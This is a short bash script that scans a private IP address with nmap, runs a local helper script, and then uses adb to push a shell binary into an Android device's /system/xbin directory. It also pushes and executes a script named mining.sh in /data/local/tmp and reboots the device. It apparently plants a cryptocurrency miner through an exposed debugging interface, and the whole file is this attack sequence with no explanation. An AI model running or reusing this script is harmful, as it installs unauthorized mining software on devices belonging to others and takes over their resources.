#!/bin/bash

nmap 192.168.100.218 > result.txt

./hello.sh

sleep 3
adb push sh /system/xbin/

adb push mining.sh /data/local/tmp/
adb shell /data/local/tmp/mining.sh 1

sleep 20
adb reboot
